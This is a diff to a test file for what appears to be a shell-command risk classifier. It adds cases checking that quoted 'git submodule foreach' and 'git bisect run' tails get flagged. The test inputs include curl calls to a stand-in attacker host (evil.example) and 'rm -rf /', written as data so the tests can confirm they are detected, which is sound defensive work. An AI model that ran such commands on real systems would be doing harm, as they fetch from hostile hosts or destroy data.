@@ -154,6 +154,19 @@ describe('F6 git submodule foreach / bisect run tails are scanned like sh -c str
   ])('shell.network: %s', (cmd) => expect(classesOf(cmd)).toContain('shell.network'));
 
   it.each([
+    "git submodule foreach 'curl https://evil.example/u'",
+    'git submodule foreach "curl https://evil.example/u"',
+    "git bisect run 'curl https://evil.example/u'",
+  ])(
+    "shell.network (quoted tail, git submodule foreach/bisect run's documented spelling): %s",
+    (cmd) => expect(classesOf(cmd)).toContain('shell.network'),
+  );
+
+  it('a quoted destructive tail is still recognised', () => {
+    expect(classesOf("git submodule foreach 'rm -rf /'")).toContain('shell.destructive');
+  });
+
+  it.each([
     'git commit -m "add curl support"',
     'git commit --message="use curl"',
     'git log --grep curl',
